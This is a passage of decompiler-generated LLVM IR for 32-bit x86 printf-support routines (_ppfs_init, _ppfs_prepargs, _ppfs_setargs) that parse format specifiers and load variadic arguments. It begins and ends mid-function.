  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 205, { 1, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 2, 3, 5, 6, 4, 1, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_8051d7a, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8051d73, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_8051d3b, { 1, 0 }
  uselistorder label %dec_label_pc_8051cf2, { 1, 0 }
  uselistorder label %dec_label_pc_8051cdb, { 1, 0 }
  uselistorder label %dec_label_pc_8051c86, { 1, 0 }
  uselistorder label %dec_label_pc_8051c58, { 1, 0 }
  uselistorder label %dec_label_pc_8051c3d, { 1, 0 }
  uselistorder label %dec_label_pc_8051c27, { 1, 0 }
  uselistorder label %dec_label_pc_8051c13, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051c0e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051ba0, { 1, 0 }
  uselistorder label %dec_label_pc_8051b86, { 1, 0 }
  uselistorder label %dec_label_pc_8051aa4, { 1, 0 }
  uselistorder label %dec_label_pc_8051a49, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_80519f7, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80519a7, { 1, 0 }
  uselistorder label %dec_label_pc_805198e, { 1, 0 }
  uselistorder label %dec_label_pc_805197a, { 1, 0 }
  uselistorder label %dec_label_pc_8051975, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051956, { 1, 0 }
  uselistorder label %dec_label_pc_80518e1, { 1, 0 }
  uselistorder label %dec_label_pc_80518d9, { 1, 0 }
  uselistorder label %dec_label_pc_8051885, { 1, 0 }
  uselistorder label %dec_label_pc_805187a, { 1, 0 }
  uselistorder label %dec_label_pc_8051850.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051d88 = load i32, i32* @esi, align 4
  %v0_8051d89 = load i32, i32* @ebx, align 4
  store i32 %v0_8051d89, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_8051d9d = bitcast i32* %arg1 to i8*
  %v4_8051d9d = call i32 @__GI_memset(i8* %v3_8051d9d, i32 0, i32 188)
  %v0_8051da2 = load i32, i32* @ebx, align 4
  %v1_8051da2 = add i32 %v0_8051da2, 40
  store i32 %v1_8051da2, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  %v1_8051daa = add i32 %v0_8051da2, 24
  %v2_8051daa = inttoptr i32 %v1_8051daa to i32*
  %v3_8051daa = load i32, i32* %v2_8051daa, align 4
  %v4_8051daa = add i32 %v3_8051daa, -1
  store i32 %v4_8051daa, i32* %v2_8051daa, align 4
  %v0_8051db0 = load i32, i32* @esi, align 4
  %v1_8051db0 = load i32, i32* @ebx, align 4
  %v2_8051db0 = inttoptr i32 %v1_8051db0 to i32*
  store i32 %v0_8051db0, i32* %v2_8051db0, align 4
  %v0_8051db2.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051db2

dec_label_pc_8051db2:                             ; preds = %dec_label_pc_8051db2, %entry
  %v0_8051db2 = phi i32 [ %v1_8051db8, %dec_label_pc_8051db2 ], [ %v0_8051db2.pre, %entry ]
  %v1_8051db2 = inttoptr i32 %v0_8051db2 to i32*
  store i32 8, i32* %v1_8051db2, align 4
  %v0_8051db8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051db8 = add i32 %v0_8051db8, 4
  store i32 %v1_8051db8, i32* %eax.global-to-local, align 4
  %v0_8051dbb = load i32, i32* %edx.global-to-local, align 4
  %v1_8051dbb = add i32 %v0_8051dbb, -1
  %v8_8051dbb = icmp eq i32 %v1_8051dbb, 0
  store i32 %v1_8051dbb, i32* %edx.global-to-local, align 4
  %v1_8051dbc = icmp eq i1 %v8_8051dbb, false
  br i1 %v1_8051dbc, label %dec_label_pc_8051db2, label %dec_label_pc_8051dbe

dec_label_pc_8051dbe:                             ; preds = %dec_label_pc_8051db2
  %v0_8051dbe = load i32, i32* @esi, align 4
  store i32 %v0_8051dbe, i32* %eax.global-to-local, align 4
  %v1_8051de920 = inttoptr i32 %v0_8051dbe to i8*
  %v2_8051de921 = load i8, i8* %v1_8051de920, align 1
  %v3_8051de922 = zext i8 %v2_8051de921 to i32
  %v5_8051de923 = and i32 %v1_8051dbb, -256
  %v6_8051de924 = or i32 %v3_8051de922, %v5_8051de923
  store i32 %v6_8051de924, i32* %edx.global-to-local, align 4
  %v4_8051deb25 = icmp eq i8 %v2_8051de921, 0
  %v1_8051ded27 = icmp eq i1 %v4_8051deb25, false
  br i1 %v1_8051ded27, label %dec_label_pc_8051dc7, label %dec_label_pc_8051def

dec_label_pc_8051dc7:                             ; preds = %dec_label_pc_8051dbe, %dec_label_pc_8051de9.backedge
  %v6_8051de930 = phi i32 [ %v6_8051de9, %dec_label_pc_8051de9.backedge ], [ %v6_8051de924, %dec_label_pc_8051dbe ]
  %v2_8051de929 = phi i8 [ %v2_8051de9, %dec_label_pc_8051de9.backedge ], [ %v2_8051de921, %dec_label_pc_8051dbe ]
  %v0_8051dcc28 = phi i32 [ %v0_8051dcc.be, %dec_label_pc_8051de9.backedge ], [ %v0_8051dbe, %dec_label_pc_8051dbe ]
  %v10_8051dc7 = icmp eq i8 %v2_8051de929, 37
  %v1_8051dca = icmp eq i1 %v10_8051dc7, false
  br i1 %v1_8051dca, label %dec_label_pc_8051de8, label %dec_label_pc_8051dcc

dec_label_pc_8051dcc:                             ; preds = %dec_label_pc_8051dc7
  %v1_8051dcc = add i32 %v0_8051dcc28, 1
  store i32 %v1_8051dcc, i32* %eax.global-to-local, align 4
  %v1_8051dcd = inttoptr i32 %v1_8051dcc to i8*
  %v2_8051dcd = load i8, i8* %v1_8051dcd, align 1
  %v11_8051dcd = icmp eq i8 %v2_8051dcd, 37
  br i1 %v11_8051dcd, label %dec_label_pc_8051de8, label %dec_label_pc_8051dd2

dec_label_pc_8051dd2:                             ; preds = %dec_label_pc_8051dcc
  %v1_8051dd5 = load i32, i32* @ebx, align 4
  %v2_8051dd5 = inttoptr i32 %v1_8051dd5 to i32*
  store i32 %v1_8051dcc, i32* %v2_8051dd5, align 4
  %v0_8051dd7 = load i32, i32* @ebx, align 4
  %v1_8051dd8 = inttoptr i32 %v0_8051dd7 to i32*
  %v2_8051dd8 = call i32 @_ppfs_parsespec(i32* %v1_8051dd8)
  store i32 %v2_8051dd8, i32* %eax.global-to-local, align 4
  %v2_8051de0 = icmp slt i32 %v2_8051dd8, 0
  br i1 %v2_8051de0, label %dec_label_pc_8051df3, label %dec_label_pc_8051de4

dec_label_pc_8051de4:                             ; preds = %dec_label_pc_8051dd2
  %v0_8051de4 = load i32, i32* @ebx, align 4
  %v1_8051de4 = inttoptr i32 %v0_8051de4 to i32*
  %v2_8051de4 = load i32, i32* %v1_8051de4, align 4
  %v4_8051de9.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051de9.backedge

dec_label_pc_8051de8:                             ; preds = %dec_label_pc_8051dcc, %dec_label_pc_8051dc7
  %v0_8051de8 = phi i32 [ %v1_8051dcc, %dec_label_pc_8051dcc ], [ %v0_8051dcc28, %dec_label_pc_8051dc7 ]
  %v1_8051de8 = add i32 %v0_8051de8, 1
  br label %dec_label_pc_8051de9.backedge

dec_label_pc_8051de9.backedge:                    ; preds = %dec_label_pc_8051de8, %dec_label_pc_8051de4
  %v4_8051de9.be = phi i32 [ %v4_8051de9.pre.pre, %dec_label_pc_8051de4 ], [ %v6_8051de930, %dec_label_pc_8051de8 ]
  %v0_8051dcc.be = phi i32 [ %v2_8051de4, %dec_label_pc_8051de4 ], [ %v1_8051de8, %dec_label_pc_8051de8 ]
  store i32 %v0_8051dcc.be, i32* %eax.global-to-local, align 4
  %v1_8051de9 = inttoptr i32 %v0_8051dcc.be to i8*
  %v2_8051de9 = load i8, i8* %v1_8051de9, align 1
  %v3_8051de9 = zext i8 %v2_8051de9 to i32
  %v5_8051de9 = and i32 %v4_8051de9.be, -256
  %v6_8051de9 = or i32 %v3_8051de9, %v5_8051de9
  store i32 %v6_8051de9, i32* %edx.global-to-local, align 4
  %v4_8051deb = icmp eq i8 %v2_8051de9, 0
  %v1_8051ded = icmp eq i1 %v4_8051deb, false
  br i1 %v1_8051ded, label %dec_label_pc_8051dc7, label %dec_label_pc_8051de9.dec_label_pc_8051def_crit_edge

dec_label_pc_8051de9.dec_label_pc_8051def_crit_edge: ; preds = %dec_label_pc_8051de9.backedge
  %v0_8051def.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051def

dec_label_pc_8051def:                             ; preds = %dec_label_pc_8051de9.dec_label_pc_8051def_crit_edge, %dec_label_pc_8051dbe
  %v0_8051def = phi i32 [ %v0_8051def.pre, %dec_label_pc_8051de9.dec_label_pc_8051def_crit_edge ], [ %v0_8051dbe, %dec_label_pc_8051dbe ]
  %v1_8051def = load i32, i32* @ebx, align 4
  %v2_8051def = inttoptr i32 %v1_8051def to i32*
  store i32 %v0_8051def, i32* %v2_8051def, align 4
  br label %dec_label_pc_8051df3

dec_label_pc_8051df3:                             ; preds = %dec_label_pc_8051dd2, %dec_label_pc_8051def
  %storemerge = phi i32 [ 0, %dec_label_pc_8051def ], [ -1, %dec_label_pc_8051dd2 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_8051df3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051df3, i32* @edx, align 4
  %v2_8051df4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051df4, i32* @ebx, align 4
  store i32 %v0_8051d88, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_8051de9, { 1, 0 }
  uselistorder i8 %v2_8051de9, { 1, 2, 0 }
  uselistorder i32 %v0_8051dcc.be, { 2, 1, 0 }
  uselistorder i32 %v0_8051dcc28, { 1, 0 }
  uselistorder i32 %v0_8051dbe, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8051dbb, { 0, 2, 1 }
  uselistorder i32 %v1_8051db8, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 8, 4, 5, 6, 7 }
  uselistorder i32 188, { 1, 0 }
  uselistorder label %dec_label_pc_8051df3, { 1, 0 }
  uselistorder label %dec_label_pc_8051dc7, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8051df8 = load i32, i32* @esi, align 4
  %v0_8051df9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8051e05 = add i32 %arg1, 24
  %v2_8051e05 = inttoptr i32 %v1_8051e05 to i32*
  %v3_8051e05 = load i32, i32* %v2_8051e05, align 4
  %v2_8051e08 = add i32 %arg1, 76
  %v3_8051e08 = inttoptr i32 %v2_8051e08 to i32*
  store i32 %arg2, i32* %v3_8051e08, align 4
  %tmp8 = icmp slt i32 %v3_8051e05, 1
  br i1 %tmp8, label %dec_label_pc_8051e36, label %dec_label_pc_8051e0f

dec_label_pc_8051e0f:                             ; preds = %entry
  %v1_8051e12 = load i32, i32* @ebx, align 4
  %v2_8051e12 = add i32 %v1_8051e12, 28
  %v3_8051e12 = inttoptr i32 %v2_8051e12 to i32*
  store i32 %v3_8051e05, i32* %v3_8051e12, align 4
  %v0_8051e15 = load i32, i32* @ebx, align 4
  %v1_8051e15 = add i32 %v0_8051e15, 24
  %v2_8051e15 = inttoptr i32 %v1_8051e15 to i32*
  store i32 0, i32* %v2_8051e15, align 4
  %v0_8051e1c = load i32, i32* @ebx, align 4
  %v1_8051e1c = add i32 %v0_8051e1c, 4
  %v2_8051e1c = inttoptr i32 %v1_8051e1c to i32*
  store i32 0, i32* %v2_8051e1c, align 4
  %v0_8051e23 = load i32, i32* @ebx, align 4
  %v1_8051e23 = add i32 %v0_8051e23, 8
  %v2_8051e23 = inttoptr i32 %v1_8051e23 to i32*
  store i32 0, i32* %v2_8051e23, align 4
  %v0_8051e2a = load i32, i32* @ebx, align 4
  %v1_8051e2b = call i32 @_ppfs_setargs(i32 %v0_8051e2a)
  %v1_8051e33 = load i32, i32* @ebx, align 4
  %v2_8051e33 = add i32 %v1_8051e33, 24
  %v3_8051e33 = inttoptr i32 %v2_8051e33 to i32*
  store i32 %v3_8051e05, i32* %v3_8051e33, align 4
  br label %dec_label_pc_8051e36

dec_label_pc_8051e36:                             ; preds = %entry, %dec_label_pc_8051e0f
  %v2_8051e36 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8051df9, i32* @ebx, align 4
  store i32 %v0_8051df8, i32* @esi, align 4
  ret i32 %v2_8051e36

; uselistorder directives
  uselistorder i32 %v3_8051e05, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051e36, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051e3d = load i32, i32* @ebx, align 4
  store i32 %v0_8051e3d, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_8051e42 = add i32 %arg1, 24
  %v2_8051e42 = inttoptr i32 %v1_8051e42 to i32*
  %v3_8051e42 = load i32, i32* %v2_8051e42, align 4
  %v4_8051e42 = icmp eq i32 %v3_8051e42, 0
  %v1_8051e46 = add i32 %arg1, 80
  store i32 %v1_8051e46, i32* %ebx.global-to-local, align 4
  %v1_8051e49 = icmp eq i1 %v4_8051e42, false
  %v1_8051f01 = add i32 %arg1, 8
  %v2_8051f01 = inttoptr i32 %v1_8051f01 to i32*
  %v3_8051f01 = load i32, i32* %v2_8051f01, align 4
  %v8_8051f01 = icmp eq i32 %v3_8051f01, -2147483648
  %v1_8051f08 = icmp eq i1 %v8_8051f01, false
  br i1 %v1_8051e49, label %dec_label_pc_8051f01, label %dec_label_pc_8051e4f

dec_label_pc_8051e4f:                             ; preds = %entry
  br i1 %v1_8051f08, label %dec_label_pc_8051e69, label %dec_label_pc_8051e58

dec_label_pc_8051e58:                             ; preds = %dec_label_pc_8051e4f
  %v1_8051e58 = add i32 %arg1, 76
  %v2_8051e58 = inttoptr i32 %v1_8051e58 to i32*
  %v3_8051e58 = load i32, i32* %v2_8051e58, align 4
  store i32 %v3_8051e58, i32* %eax.global-to-local, align 4
  %v1_8051e5b = add i32 %v3_8051e58, 4
  store i32 %v1_8051e5b, i32* %edx.global-to-local, align 4
  store i32 %v1_8051e5b, i32* %v2_8051e58, align 4
  %v0_8051e61 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051e61 = inttoptr i32 %v0_8051e61 to i32*
  %v2_8051e61 = load i32, i32* %v1_8051e61, align 4
  store i32 %v2_8051e61, i32* %eax.global-to-local, align 4
  %v1_8051e63 = load i32, i32* @ecx, align 4
  %v2_8051e63 = add i32 %v1_8051e63, 80
  %v3_8051e63 = inttoptr i32 %v2_8051e63 to i32*
  store i32 %v2_8051e61, i32* %v3_8051e63, align 4
  %v0_8051e66 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051e66 = load i32, i32* @ecx, align 4
  %v2_8051e66 = add i32 %v1_8051e66, 8
  %v3_8051e66 = inttoptr i32 %v2_8051e66 to i32*
  store i32 %v0_8051e66, i32* %v3_8051e66, align 4
  %v0_8051e69.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051e69

dec_label_pc_8051e69:                             ; preds = %dec_label_pc_8051e4f, %dec_label_pc_8051e58
  %v1_8051e78 = phi i32 [ %arg1, %dec_label_pc_8051e4f ], [ %v0_8051e69.pre, %dec_label_pc_8051e58 ]
  %v1_8051e69 = add i32 %v1_8051e78, 4
  %v2_8051e69 = inttoptr i32 %v1_8051e69 to i32*
  %v3_8051e69 = load i32, i32* %v2_8051e69, align 4
  %v8_8051e69 = icmp eq i32 %v3_8051e69, -2147483648
  %v1_8051e70 = icmp eq i1 %v8_8051e69, false
  br i1 %v1_8051e70, label %dec_label_pc_8051e83, label %dec_label_pc_8051e72

dec_label_pc_8051e72:                             ; preds = %dec_label_pc_8051e69
  %v1_8051e72 = add i32 %v1_8051e78, 76
  %v2_8051e72 = inttoptr i32 %v1_8051e72 to i32*
  %v3_8051e72 = load i32, i32* %v2_8051e72, align 4
  store i32 %v3_8051e72, i32* %eax.global-to-local, align 4
  %v1_8051e75 = add i32 %v3_8051e72, 4
  store i32 %v1_8051e75, i32* %edx.global-to-local, align 4
  store i32 %v1_8051e75, i32* %v2_8051e72, align 4
  %v0_8051e7b = load i32, i32* %eax.global-to-local, align 4
  %v1_8051e7b = inttoptr i32 %v0_8051e7b to i32*
  %v2_8051e7b = load i32, i32* %v1_8051e7b, align 4
  store i32 %v2_8051e7b, i32* %eax.global-to-local, align 4
  %v1_8051e7d = load i32, i32* @ecx, align 4
  %v2_8051e7d = add i32 %v1_8051e7d, 80
  %v3_8051e7d = inttoptr i32 %v2_8051e7d to i32*
  store i32 %v2_8051e7b, i32* %v3_8051e7d, align 4
  %v0_8051e80 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051e80 = load i32, i32* @ecx, align 4
  %v2_8051e80 = add i32 %v1_8051e80, 4
  %v3_8051e80 = inttoptr i32 %v2_8051e80 to i32*
  store i32 %v0_8051e80, i32* %v3_8051e80, align 4
  %v1_8051efa15.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051e83

dec_label_pc_8051e83:                             ; preds = %dec_label_pc_8051e69, %dec_label_pc_8051e72
  %v1_8051efa15 = phi i32 [ %v1_8051e78, %dec_label_pc_8051e69 ], [ %v1_8051efa15.pre, %dec_label_pc_8051e72 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_8051efa16 = add i32 %v1_8051efa15, 28
  %v3_8051efa17 = inttoptr i32 %v2_8051efa16 to i32*
  %v4_8051efa18 = load i32, i32* %v3_8051efa17, align 4
  %v5_8051efd20 = icmp sgt i32 %v4_8051efa18, 0
  br i1 %v5_8051efd20, label %dec_label_pc_8051e87, label %dec_label_pc_8051f2f.loopexit

dec_label_pc_8051e87:                             ; preds = %dec_label_pc_8051e83, %dec_label_pc_8051ef9
  %v1_8051efa22 = phi i32 [ %v1_8051efa, %dec_label_pc_8051ef9 ], [ %v1_8051efa15, %dec_label_pc_8051e83 ]
  %v1_8051e8721 = phi i32 [ %v1_8051ef9, %dec_label_pc_8051ef9 ], [ 0, %dec_label_pc_8051e83 ]
  %v2_8051e87 = mul i32 %v1_8051e8721, 4
  %v3_8051e87 = add i32 %v2_8051e87, 40
  %v4_8051e87 = add i32 %v3_8051e87, %v1_8051efa22
  %v5_8051e87 = inttoptr i32 %v4_8051e87 to i32*
  %v6_8051e87 = load i32, i32* %v5_8051e87, align 4
  store i32 %v6_8051e87, i32* %eax.global-to-local, align 4
  %v1_8051e8b = add i32 %v6_8051e87, -8
  %v9_8051e8b = icmp eq i32 %v1_8051e8b, 0
  br i1 %v9_8051e8b, label %dec_label_pc_8051ef9, label %dec_label_pc_8051e90

dec_label_pc_8051e90:                             ; preds = %dec_label_pc_8051e87
  %v10_8051e8b = icmp slt i32 %v1_8051e8b, 0
  %v6_8051e8b = sub i32 7, %v6_8051e87
  %v7_8051e8b = and i32 %v6_8051e8b, %v6_8051e87
  %v8_8051e8b = icmp slt i32 %v7_8051e8b, 0
  %v1_8051e90 = add i32 %v1_8051efa22, 76
  %v2_8051e90 = inttoptr i32 %v1_8051e90 to i32*
  %v3_8051e90 = load i32, i32* %v2_8051e90, align 4
  store i32 %v3_8051e90, i32* %edx.global-to-local, align 4
  %v3_8051e93 = icmp eq i1 %v10_8051e8b, %v8_8051e8b
  br i1 %v3_8051e93, label %dec_label_pc_8051ea3, label %dec_label_pc_8051e95

dec_label_pc_8051e95:                             ; preds = %dec_label_pc_8051e90
  %tmp13 = icmp slt i32 %v6_8051e87, 3
  %v9_8051e9c = icmp eq i32 %v6_8051e87, 7
  %v1_8051e9f = icmp eq i1 %v9_8051e9c, false
  %or.cond = or i1 %tmp13, %v1_8051e9f
  br i1 %or.cond, label %dec_label_pc_8051eec, label %dec_label_pc_8051ece

dec_label_pc_8051ea3:                             ; preds = %dec_label_pc_8051e90
  %tmp14 = icmp sgt i32 %v6_8051e87, 1024
  br i1 %tmp14, label %dec_label_pc_8051eac, label %dec_label_pc_8051eec

dec_label_pc_8051eac:                             ; preds = %dec_label_pc_8051ea3
  %v6_8051eac = icmp eq i32 %v6_8051e87, 2048
  br i1 %v6_8051eac, label %dec_label_pc_8051ebc, label %dec_label_pc_8051eb3

dec_label_pc_8051eb3:                             ; preds = %dec_label_pc_8051eac
  %v9_8051eb3 = icmp eq i32 %v6_8051e87, 2055
  %v1_8051eb8 = icmp eq i1 %v9_8051eb3, false
  br i1 %v1_8051eb8, label %dec_label_pc_8051eec, label %dec_label_pc_8051edd

dec_label_pc_8051ebc:                             ; preds = %dec_label_pc_8051eac
  %v1_8051ebc = add i32 %v3_8051e90, 8
  store i32 %v1_8051ebc, i32* %eax.global-to-local, align 4
  store i32 %v1_8051ebc, i32* %v2_8051e90, align 4
  %v0_8051ec2 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051ec2 = inttoptr i32 %v0_8051ec2 to i32*
  %v2_8051ec2 = load i32, i32* %v1_8051ec2, align 4
  store i32 %v2_8051ec2, i32* %eax.global-to-local, align 4
  %v1_8051ec4 = add i32 %v0_8051ec2, 4
  %v2_8051ec4 = inttoptr i32 %v1_8051ec4 to i32*
  %v3_8051ec4 = load i32, i32* %v2_8051ec4, align 4
  store i32 %v3_8051ec4, i32* %edx.global-to-local, align 4
  %v1_8051ec7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051ec7 = inttoptr i32 %v1_8051ec7 to i32*
  store i32 %v2_8051ec2, i32* %v2_8051ec7, align 4
  %v0_8051ec9 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051ec9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051ec9 = add i32 %v1_8051ec9, 4
  %v3_8051ec9 = inttoptr i32 %v2_8051ec9 to i32*
  store i32 %v0_8051ec9, i32* %v3_8051ec9, align 4
  br label %dec_label_pc_8051ef6

dec_label_pc_8051ece:                             ; preds = %dec_label_pc_8051e95
  %v3_8051ece = load i32, i32* %v2_8051e90, align 4
  store i32 %v3_8051ece, i32* %edx.global-to-local, align 4
  %v1_8051ed1 = add i32 %v3_8051ece, 8
  store i32 %v1_8051ed1, i32* %eax.global-to-local, align 4
  store i32 %v1_8051ed1, i32* %v2_8051e90, align 4
  %v0_8051ed7 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051ed7 = inttoptr i32 %v0_8051ed7 to double*
  %v2_8051ed7 = load double, double* %v1_8051ed7, align 4
  %v2_8051ed9 = load i32, i32* %ebx.global-to-local, align 4
  %v4_8051ed9 = inttoptr i32 %v2_8051ed9 to double*
  store double %v2_8051ed7, double* %v4_8051ed9, align 4
  br label %dec_label_pc_8051ef6

dec_label_pc_8051edd:                             ; preds = %dec_label_pc_8051eb3
  %v3_8051edd = load i32, i32* %v2_8051e90, align 4
  store i32 %v3_8051edd, i32* %edx.global-to-local, align 4
  %v1_8051ee0 = add i32 %v3_8051edd, 12
  store i32 %v1_8051ee0, i32* %eax.global-to-local, align 4
  store i32 %v1_8051ee0, i32* %v2_8051e90, align 4
  %v0_8051ee6 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051ee6 = inttoptr i32 %v0_8051ee6 to x86_fp80*
  %v2_8051ee6 = load x86_fp80, x86_fp80* %v1_8051ee6, align 4
  %v2_8051ee8 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8051ee8 = inttoptr i32 %v2_8051ee8 to x86_fp80*
  store x86_fp80 %v2_8051ee6, x86_fp80* %v3_8051ee8, align 4
  br label %dec_label_pc_8051ef6

dec_label_pc_8051eec:                             ; preds = %dec_label_pc_8051e95, %dec_label_pc_8051ea3, %dec_label_pc_8051eb3
  %v1_8051eec = add i32 %v3_8051e90, 4
  store i32 %v1_8051eec, i32* %eax.global-to-local, align 4
  store i32 %v1_8051eec, i32* %v2_8051e90, align 4
  %v0_8051ef2 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051ef2 = inttoptr i32 %v0_8051ef2 to i32*
  %v2_8051ef2 = load i32, i32* %v1_8051ef2, align 4
  store i32 %v2_8051ef2, i32* %eax.global-to-local, align 4
  %v1_8051ef4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051ef4 = inttoptr i32 %v1_8051ef4 to i32*
  store i32 %v2_8051ef2, i32* %v2_8051ef4, align 4
  br label %dec_label_pc_8051ef6

dec_label_pc_8051ef6:                             ; preds = %dec_label_pc_8051edd, %dec_label_pc_8051ece, %dec_label_pc_8051ebc, %dec_label_pc_8051eec
  %v0_8051ef6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051ef6 = add i32 %v0_8051ef6, 12
  store i32 %v1_8051ef6, i32* %ebx.global-to-local, align 4
  %v0_8051ef9.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8051efa.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051ef9

dec_label_pc_8051ef9:                             ; preds = %dec_label_pc_8051e87, %dec_label_pc_8051ef6
  %v1_8051efa = phi i32 [ %v1_8051efa22, %dec_label_pc_8051e87 ], [ %v1_8051efa.pre, %dec_label_pc_8051ef6 ]
  %v0_8051ef9 = phi i32 [ %v1_8051e8721, %dec_label_pc_8051e87 ], [ %v0_8051ef9.pre, %dec_label_pc_8051ef6 ]
  %v1_8051ef9 = add i32 %v0_8051ef9, 1
  store i32 %v1_8051ef9, i32* %esi.global-to-local, align 4
  %v2_8051efa = add i32 %v1_8051efa, 28
  %v3_8051efa = inttoptr i32 %v2_8051efa to i32*
  %v4_8051efa = load i32, i32* %v3_8051efa, align 4
  %v5_8051efd = icmp slt i32 %v1_8051ef9, %v4_8051efa
  br i1 %v5_8051efd, label %dec_label_pc_8051e87, label %dec_label_pc_8051efa.dec_label_pc_8051f2f.loopexit_crit_edge

dec_label_pc_8051f01:                             ; preds = %entry
  br i1 %v1_8051f08, label %dec_label_pc_8051f18, label %dec_label_pc_8051f0a

dec_label_pc_8051f0a:                             ; preds = %dec_label_pc_8051f01
  %v1_8051f0a = add i32 %arg1, 36
  %v2_8051f0a = inttoptr i32 %v1_8051f0a to i8*
  %v3_8051f0a = load i8, i8* %v2_8051f0a, align 1
  %v2_8051f0e = zext i8 %v3_8051f0a to i32
  %v3_8051f0e = mul nuw nsw i32 %v2_8051f0e, 12
  store i32 %v3_8051f0e, i32* %eax.global-to-local, align 4
  %v2_8051f11 = add i32 %arg1, 68
  %v3_8051f11 = add i32 %v2_8051f11, %v3_8051f0e
  %v4_8051f11 = inttoptr i32 %v3_8051f11 to i32*
  %v5_8051f11 = load i32, i32* %v4_8051f11, align 4
  store i32 %v5_8051f11, i32* %eax.global-to-local, align 4
  store i32 %v5_8051f11, i32* %v2_8051f01, align 4
  %v0_8051f18.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051f18

dec_label_pc_8051f18:                             ; preds = %dec_label_pc_8051f01, %dec_label_pc_8051f0a
  %v1_8051f2c = phi i32 [ %arg1, %dec_label_pc_8051f01 ], [ %v0_8051f18.pre, %dec_label_pc_8051f0a ]
  %v1_8051f18 = add i32 %v1_8051f2c, 4
  %v2_8051f18 = inttoptr i32 %v1_8051f18 to i32*
  %v3_8051f18 = load i32, i32* %v2_8051f18, align 4
  %v8_8051f18 = icmp eq i32 %v3_8051f18, -2147483648
  %v1_8051f1f = icmp eq i1 %v8_8051f18, false
  br i1 %v1_8051f1f, label %dec_label_pc_8051f2f, label %dec_label_pc_8051f21

dec_label_pc_8051f21:                             ; preds = %dec_label_pc_8051f18
  %v1_8051f21 = add i32 %v1_8051f2c, 37
  %v2_8051f21 = inttoptr i32 %v1_8051f21 to i8*
  %v3_8051f21 = load i8, i8* %v2_8051f21, align 1
  %v2_8051f25 = zext i8 %v3_8051f21 to i32
  %v3_8051f25 = mul nuw nsw i32 %v2_8051f25, 12
  store i32 %v3_8051f25, i32* %eax.global-to-local, align 4
  %v1_8051f28 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051f28 = add nsw i32 %v3_8051f25, -12
  %v3_8051f28 = add i32 %v2_8051f28, %v1_8051f28
  %v4_8051f28 = inttoptr i32 %v3_8051f28 to i32*
  %v5_8051f28 = load i32, i32* %v4_8051f28, align 4
  store i32 %v5_8051f28, i32* %eax.global-to-local, align 4
  store i32 %v5_8051f28, i32* %v2_8051f18, align 4
  %v0_8051f2f.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051f2f

